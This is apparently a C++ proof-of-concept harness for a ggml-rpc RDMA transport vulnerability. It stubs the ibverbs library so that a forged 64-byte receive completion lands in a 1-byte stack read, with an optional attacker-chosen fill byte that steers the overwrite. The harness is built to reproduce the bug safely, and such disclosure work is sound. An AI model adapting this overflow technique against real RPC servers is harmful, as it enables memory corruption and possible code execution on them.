// Harness for CVE-2026-118375: drives the pinned, UNMODIFIED upstream
// ggml-rpc transport.cpp through its public API. The ibverbs layer is a
// stand-in (shim/infiniband/verbs.h + stubs below): one fake device, one fake
// receive completion whose byte_len is supplied by the harness. No RDMA
// device, no host network change, no external traffic. The loopback TCP
// connection is only the negotiation channel that the real transport uses
// before upgrading to RDMA.
#include "transport.h"
#include <arpa/inet.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <string>
#include <unistd.h>
#include <infiniband/verbs.h>

static uint32_t g_byte_len = 64;
static void * g_rx_buf = nullptr;
static bool g_rcq_served = false;

std::string rpc_log_format_size(size_t size) { return std::to_string(size); }

extern "C" {

struct ibv_device ** ibv_get_device_list(int * n) {
    static struct ibv_device dev = {};
    static struct ibv_device * list[2] = { &dev, nullptr };
    if (n) *n = 1;
    return list;
}
void ibv_free_device_list(struct ibv_device **) {}
const char * ibv_get_device_name(struct ibv_device *) { return "rxe0-stub"; }
struct ibv_context * ibv_open_device(struct ibv_device *) { static struct ibv_context c = {}; return &c; }
int ibv_close_device(struct ibv_context *) { return 0; }
int ibv_query_port(struct ibv_context *, uint8_t, struct ibv_port_attr * a) {
    a->gid_tbl_len = 1; a->active_mtu = IBV_MTU_1024; return 0;
}
static void stub_gid(struct ibv_gid * g) {
    memset(g, 0, sizeof(*g));
    g->raw[10] = 0xff; g->raw[11] = 0xff;
    g->raw[12] = 127; g->raw[13] = 0; g->raw[14] = 0; g->raw[15] = 1;
}
int ibv_query_gid(struct ibv_context *, uint8_t, int, struct ibv_gid * g) { stub_gid(g); return 0; }
int ibv_query_gid_ex(struct ibv_context *, uint32_t, uint32_t, struct ibv_gid_entry * e, uint32_t) {
    stub_gid(&e->gid); e->gid_type = IBV_GID_TYPE_ROCE_V2; return 0;
}
struct ibv_pd * ibv_alloc_pd(struct ibv_context *) { static struct ibv_pd p = {}; return &p; }
int ibv_dealloc_pd(struct ibv_pd *) { return 0; }
struct ibv_comp_channel * ibv_create_comp_channel(struct ibv_context *) {
    static struct ibv_comp_channel ch = { -1 }; return &ch;
}
int ibv_destroy_comp_channel(struct ibv_comp_channel *) { return 0; }
struct ibv_cq * ibv_create_cq(struct ibv_context *, int cqe, void *, struct ibv_comp_channel *, int) {
    struct ibv_cq * cq = (struct ibv_cq *)calloc(1, sizeof(*cq));
    cq->kind = (cqe == 16) ? 0 : 28; // send CQ has 16 entries, receive CQ 28
    return cq;
}
int ibv_destroy_cq(struct ibv_cq * cq) { free(cq); return 0; }
int ibv_get_cq_event(struct ibv_comp_channel *, struct ibv_cq **, void **) { return 0; }
void ibv_ack_cq_events(struct ibv_cq *, unsigned int) {}
struct ibv_qp * ibv_create_qp(struct ibv_pd *, struct ibv_qp_init_attr * a) {
    struct ibv_qp * qp = (struct ibv_qp *)calloc(1, sizeof(*qp));
    qp->qp_num = 0x1234;
    (void)a;
    return qp;
}
int ibv_modify_qp(struct ibv_qp *, struct ibv_qp_attr *, int) { return 0; }
int ibv_destroy_qp(struct ibv_qp * qp) { free(qp); return 0; }
struct ibv_mr * ibv_reg_mr(struct ibv_pd *, void * addr, size_t length, int) {
    if (length > 1024 * 1024 && !g_rx_buf) g_rx_buf = addr; // server registers first
    struct ibv_mr * mr = (struct ibv_mr *)calloc(1, sizeof(*mr));
    mr->lkey = 1; mr->rkey = 2;
    return mr;
}
int ibv_dereg_mr(struct ibv_mr * mr) { free(mr); return 0; }
int ibv_post_recv(struct ibv_qp *, struct ibv_recv_wr *, struct ibv_recv_wr **) { return 0; }
int ibv_post_send(struct ibv_qp *, struct ibv_send_wr *, struct ibv_send_wr **) { return 0; }
int ibv_poll_cq(struct ibv_cq * cq, int n, struct ibv_wc * wc) {
    if (n < 1) return 0;
    if (cq->kind == 28 && !g_rcq_served) {
        g_rcq_served = true;
        memset(wc, 0, sizeof(*wc));
        wc->status = IBV_WC_SUCCESS;
        wc->wr_id = 0;
        wc->byte_len = g_byte_len;
        return 1;
    }
    // Second completion is an error so the real rdma_poll() returns false and
    // the harness cannot spin after the underflowing rem -= got.
    memset(wc, 0, sizeof(*wc));
    wc->status = IBV_WC_GENERAL_ERR;
    return 1;
}
int ibv_req_notify_cq(struct ibv_cq *, int) { return 0; }
const char * ibv_wc_status_str(int s) {
    return s == IBV_WC_SUCCESS ? "success" : "general-error";
}

} // extern "C"
struct frame {
    uint8_t before[32];
    uint8_t cmd;
    uint8_t after[16];
};

int main(int argc, char ** argv) {
    const bool attack = argc > 1 && strcmp(argv[1], "attack") == 0;
    g_byte_len = attack ? 64 : 1;
    // Optional second argument: a hex fill byte chosen by the harness.
    const bool steer = argc > 2;
    const uint8_t fill = steer ? (uint8_t)strtoul(argv[2], nullptr, 16) : 0;
    g_rcq_served = false;
    socket_ptr server = socket_t::create_server("127.0.0.1", 46000);
    if (!server) { std::printf("FAIL server\n"); return 2; }
    socket_ptr client = socket_t::connect("127.0.0.1", 46000);
    if (!client) { std::printf("FAIL connect\n"); return 2; }
    socket_ptr srv = server->accept();
    if (!srv) { std::printf("FAIL accept\n"); return 2; }

    uint8_t local[24] = {}, remote[24] = {};
    srv->get_caps(local);
    client->get_caps(remote);
    srv->update_caps(remote);
    client->update_caps(local);
    if (strcmp(srv->transport_name(), "RDMA") != 0 || !g_rx_buf) {
        std::printf("FAIL rdma-upgrade name=%s rx=%p\n", srv->transport_name(), g_rx_buf);
        return 2;
    }
    std::printf("transport=%s byte_len=%u\n", srv->transport_name(), g_byte_len);

    // What a malicious peer put in the posted receive slot: chosen bytes.
    uint8_t * slot = (uint8_t *)g_rx_buf;
    for (unsigned i = 0; i < g_byte_len; ++i) slot[i] = steer ? fill : (uint8_t)('A' + (i % 26));
    struct frame f;
    memset(&f, 0xcc, sizeof(f));
    f.cmd = 0;
    bool ok = srv->recv_data(&f.cmd, 1); // same 1-byte stack read as rpc_serve_client()
    std::printf("recv_data=%d cmd=0x%02x after0=0x%02x after1=0x%02x after7=0x%02x\n",
                ok ? 1 : 0, f.cmd, f.after[0], f.after[1], f.after[7]);
    return 0;
}
